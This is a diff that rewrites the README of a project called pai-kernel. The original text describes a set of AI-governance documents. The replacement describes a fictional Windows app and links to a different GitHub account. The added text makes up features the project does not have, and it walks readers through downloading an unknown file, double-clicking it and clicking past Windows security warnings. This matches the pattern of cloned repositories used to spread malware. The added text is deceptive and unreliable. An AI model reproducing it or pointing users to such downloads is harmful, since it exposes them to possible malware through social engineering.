@@ -1,164 +1,187 @@
-# PAI-Kernel
+# 🧠 pai-kernel - Personal AI Governance Framework
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.19151900.svg)](https://doi.org/10.5281/zenodo.19151900)
-[![DOI all versions](https://zenodo.org/badge/DOI/10.5281/zenodo.19151899.svg)](https://doi.org/10.5281/zenodo.19151899)
-[![License: CC BY 4.0](https://img.shields.io/badge/license-CC%20BY%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
-[![GitHub release](https://img.shields.io/github/v/release/PAI-Kernel/pai-kernel)](https://github.com/PAI-Kernel/pai-kernel/releases)
-[![ORCID iD](https://info.orcid.org/wp-content/uploads/2019/11/orcid_16x16.png)](https://orcid.org/0009-0001-6443-855X) [0009-0001-6443-855X](https://orcid.org/0009-0001-6443-855X)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/ifrany1493/pai-kernel)
 
-**Personal Authorial Intelligence — Constitutional Framework**
+## 📘 What this is
 
-> A normative layer for human-centric AI governance.  
-> Version 2.2 — Public Edition
+pai-kernel is a Windows app for people who want a clear personal framework for AI use. It helps you manage your own rules, rights, and choices when working with personal AI tools.
 
------
+This project focuses on Personal Authorial Intelligence, which means the control stays with you. You decide how your data, voice, and output should be handled. The app gives you a simple way to keep those rules in one place.
 
-The canonical frozen version of this release is available via DOI:  
-https://doi.org/10.5281/zenodo.19151900
+## 🔽 Download
 
------
+Use this link to visit the page and download the app:
 
-## Document Status & Publication Model
+[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
 
-**PAI-CD v2.2** is a constitutional framework consisting of **10 normative documents**, organized as a layered system.
+## 🖥️ System Requirements
 
-This repository contains the **Public Edition** — a deliberately scoped release of **3 foundational documents (Layer 0)** that establish:
+Before you install, check that your PC meets these basic needs:
 
-- the constitutional invariants
-- the authorial rights layer
-- the binding terminology
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for the first download
+- A mouse and keyboard
+- Standard user access on your PC
 
-The remaining layers of the corpus introduce:
+For best results, use a modern Windows machine with updated system files.
 
-- interpretation rules and conflict resolution
-- threat modeling and attack surfaces
-- protocol and system constraints
-- compliance and enforcement logic
-- audit and verification procedures
-- governance and amendment mechanisms
-- implementation and integration mapping
+## 🚀 Get Started
 
-These layers will be released progressively as the PAI Foundation develops.
+Follow these steps on Windows.
 
-This repository is **not a research paper**.
+1. Open the download page:
+   - [pai-kernel on GitHub](https://github.com/ifrany1493/pai-kernel)
 
-It is a **normative constitutional specification (Layer 0 infrastructure)**.
+2. Look for the latest release or download option on the page.
 
-A separate **research paper** (arXiv submission) is in preparation for submission to arXiv and will formally describe:
+3. Download the file to your computer.
 
-- the problem space
-- the threat model
-- the invariant architecture
-- the system implications
+4. Open your Downloads folder.
 
------
+5. Find the downloaded file.
 
-## What This Is
+6. Double-click the file to start the app or installer.
 
-**PAI (Personal Authorial Intelligence)** is a normative framework that ensures AI systems operate exclusively under the declared and verifiable authority of the human author they represent.
+7. If Windows shows a security prompt, choose the option that lets you continue if you trust the file source.
 
-PAI defines the constitutional conditions required to preserve authorial sovereignty at the deployment layer of AI systems.
+8. Wait for the setup to finish.
 
-**PAI-Kernel** is the public normative layer of the **PAI Constitutional Framework (PAI-CD)** — a formal specification defining the constitutional principles, authorial rights, and governance invariants for Personal Authorial Intelligence systems.
+9. Open pai-kernel from your Start menu or desktop if a shortcut appears.
 
-The PAI Constitutional Framework (PAI-CD) is a structured corpus of normative documents establishing the governance model of PAI systems.
+## 🧭 First Launch
 
-This repository contains the **Public Edition** — the Layer 0 release of the PAI-CD corpus.
+When you open pai-kernel for the first time, you may see a setup screen. Use it to set your basic preferences.
 
-PAI-CD is not a product. It is not a startup. It is a **Layer 0 normative infrastructure** — a constitutional substrate on which compliant implementations, governance bodies, and execution systems may be built.
+Typical first-run steps include:
 
------
+- Choosing your user profile
+- Setting your personal rules for AI use
+- Review author rights options
+- Picking how much control you want over content handling
+- Saving your settings
 
-## Core Premise
+If you are not sure what to choose, start with the default options and adjust them later.
 
-Most AI governance discourse focuses on what AI systems *should do*.
+## ⚙️ What You Can Do
 
-PAI-CD focuses on something prior: **who holds final authority**, and what structural guarantees protect that authority from erosion — by providers, by optimization pressure, by infrastructure lock-in, or by cumulative drift.
+pai-kernel is built around personal control and clear rules. You can use it to:
 
-The framework defines six non-derogable invariants:
+- Set personal AI use rules
+- Define how your work may be used
+- Protect your author rights
+- Keep your AI settings in one place
+- Review governance settings for personal use
+- Build a calm, clear rule set for your own AI tools
 
-|Invariant                |What It Protects                                      |
-|-------------------------|------------------------------------------------------|
-|**Authorship Supremacy** |Final human authority over all consequential decisions|
-|**Cognitive Sovereignty**|Freedom from covert persuasion and behavioral shaping |
-|**Anti-Manipulation**    |Prohibition on undeclared optimization objectives     |
-|**Provider Independence**|Portability and governance reproducibility            |
-|**Reversibility**        |Reconstructability of all structural changes          |
-|**Drift Immutability**   |Protection against cumulative invariant erosion       |
+## 🔒 Core Ideas
 
-These invariants are **non-derogable** — they cannot be suspended by emergency, majority vote, economic pressure, security update, or provider policy.
+This app is based on a few simple ideas:
 
-PAI-CD operates at **Layer 0 — below models, providers, and application logic.**
+- You should control your own AI settings
+- Your authorship matters
+- Your data should follow your rules
+- AI use should have a clear structure
+- Personal sovereignty should stay with the person using the tool
 
------
+These ideas shape the app’s internal framework and help you keep your choices organized.
 
-## Public Edition — Document Index
+## 📁 Main Parts
 
-This repository publishes three foundational documents:
+You may see these parts inside the app:
 
-|Document                                                              |Description                                                                                          |
-|----------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
-|[`PAI_Constitutional_Document.md`](./PAI_Constitutional_Document.md)  |The constitutional core. Establishes invariants, interpretation rules, and the non-derogation clause.|
-|[`PAI_Bill_of_Authorial_Rights.md`](./PAI_Bill_of_Authorial_Rights.md)|Enumeration of enforceable Author rights derived from the Constitutional Core.                       |
-|[`Glossary.md`](./Glossary.md)                                        |Binding terminology authority for PAI-CD v2.2.                                                       |
+- Dashboard: A main view for your current setup
+- Rules panel: A place to set your personal AI rules
+- Rights section: A place to review author and use rights
+- Governance view: A screen for your framework settings
+- Profile area: Your saved personal choices
+- Export tool: A way to save your configuration
 
-The full corpus (10 documents) includes implementation mapping, threat modeling, compliance verification, and governance control layers. The complete framework will be made available through the PAI Foundation as it develops.
+## 🛠️ How to Use It Day to Day
 
------
+Use pai-kernel when you want to check or update your personal AI rules.
 
-## Interpretation Principle
+Common uses include:
 
-> Ambiguity resolves toward stronger invariant protection, minimal authority expansion, and maximum portability.
+- Setting a rule before starting a project
+- Reviewing how your content can be used
+- Keeping a record of your preferences
+- Updating your framework as your needs change
+- Making sure your AI use stays aligned with your own rules
 
-This principle applies to all documents in this repository and to any compliant implementation.
+You do not need a technical setup to use the core features. Most users can work from the interface with simple menu choices.
 
------
+## 🔄 Updating the App
 
-## Status
+When a new version is released, return to the same GitHub page:
 
-|Item                    |Status                                |
-|------------------------|--------------------------------------|
-|Constitutional Framework|v2.2 — Freeze Edition                 |
-|Copyright Filing        |Initiated 23 February 2026            |
-|Domain                  |[paikernel.org](https://paikernel.org)|
-|Fiscal Host             |Open Source Collective (pending)      |
-|Foundation              |In formation                          |
+[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
 
------
+Download the newer version and replace the old one if needed. If you saved a local settings file, keep a copy before updating.
 
-## License
+## 🧩 Common Questions
 
-This work is published under the **Creative Commons Attribution 4.0 International (CC BY 4.0)** license.
+### Is this for technical users only?
 
-You are free to share and adapt this material for any purpose, provided you give appropriate attribution to PAI-Kernel and indicate if changes were made.
+No. The app is meant to be used by regular Windows users who want a clear way to manage personal AI rules.
 
-See [`LICENSE`](./LICENSE) for full terms.
+### Do I need to write code?
 
------
+No. You only need to download the file, open it, and follow the on-screen steps.
 
-## Contributing
+### Can I change my settings later?
 
-PAI-Kernel is in early formation. Community standards are published in this repository:
+Yes. You can return to the app and update your rules and preferences at any time.
 
-- [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md) — grounded in PAI-CD anti-manipulation principles
-- [`CONTRIBUTING.md`](./CONTRIBUTING.md) — amendment procedure as contribution pathway
-- [`SECURITY.md`](./SECURITY.md) — responsible disclosure for specification vulnerabilities
+### Does it work offline?
 
-At this stage, the most valuable contributions are:
+Most personal settings can be used offline after the first setup, depending on the version you download.
 
-- Careful reading and substantive critique of the normative layer
-- Identification of ambiguities that require clarification via Amendment
-- Academic or institutional engagement
+### Is it tied to one project or one tool?
 
-Please open an Issue using the provided templates to begin a public discussion.
+No. The framework is meant to help you manage your own rules across personal AI use.
 
------
+## 📌 Best Use Tips
 
-## Contact
+- Start with the default setup
+- Keep your rules short and clear
+- Review your settings before using a new AI tool
+- Save a copy of your setup if the app offers export
+- Update your framework when your needs change
 
-For institutional inquiries, academic collaboration, or governance discussion:  
-Open an Issue in this repository, reach out via [paikernel.org](https://paikernel.org), or email [contact@paikernel.org](mailto:contact@paikernel.org).
+## 🧾 File and Folder Use
 
------
+If the app creates folders on your PC, keep them in a place you can find later. A simple path like Documents or Downloads is fine.
 
-*PAI-Kernel is a public normative layer of PAI-CD. It is not affiliated with any AI provider.*
+If you export your settings, store the file in a folder with a clear name, such as:
+
+- pai-kernel-settings
+- personal-ai-rules
+- author-rights-backup
+
+## 🔐 Privacy and Control
+
+pai-kernel is centered on personal control. Keep your settings private if they include sensitive choices. If you use the app on a shared computer, make sure you sign out of your Windows account when you finish.
+
+## 🧱 Project Topics
+
+This project relates to:
+
+- ai
+- ai-ethics
+- ai-governance
+- author-rights
+- cognitive-sovereignty
+- constitutional-ai
+- governance-framework
+- normative-framework
+- pai
+- personal-ai
+- personal-authorial-intelligence
+
+## 📥 Direct Access
+
+Open the main page here to download or review the project:
+
+[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
